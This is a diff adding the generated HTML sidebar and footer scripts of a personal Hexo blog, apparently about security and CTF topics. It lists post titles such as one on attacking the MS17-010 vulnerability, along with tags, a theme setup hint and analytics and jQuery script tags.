+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2020/04/16/%E5%88%A9%E7%94%A8ms17-010%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB/" >利用ms17-010漏洞进行攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2020/04/12/MySQL%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%881%EF%BC%89/" >MySQL的基础操作（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2020/04/06/First-Blog/" >First Blog</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctfJarvis"><span class="iconfont-archer">&#xe606;</span>ctfJarvis</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "HacKerQWQ"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
